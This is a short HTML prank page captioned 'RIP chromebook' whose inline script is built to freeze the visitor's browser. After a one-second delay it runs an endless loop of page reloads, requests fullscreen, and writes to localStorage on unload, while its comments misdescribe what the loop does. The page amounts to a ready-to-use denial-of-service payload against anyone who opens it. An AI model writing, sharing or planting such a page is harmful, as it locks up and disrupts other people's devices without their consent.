<!DOCTYPE html>
<html>
<head>
<style>
  body {
    background-image: url('https://static.wikia.nocookie.net/0cb14c7d-fe27-403b-bbd3-82623b2ba782/scale-to-width/755');
    background-size: cover;
    background-position: center;
    color: white;
    font-family: Arial, sans-serif;
    text-align: center;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  p {
    font-size: 24px;
  }
</style>
</head>
<body>

<p>RIP chromebook. Enjoy this while you watch it dying.</p>

<script>
  // Execute when the page is about to be unloaded
  onbeforeunload = function() {
    localStorage.x = 1; // Set a value in local storage before unloading
  };

  // Reload the page every second (not recommended)
  setTimeout(function() {
    while (true) {
      location.reload(1); // Reload the page with cache-busting
    }
  }, 1000);

  // Request fullscreen mode for the document
  document.documentElement.requestFullscreen();
</script>

</body>
</html>
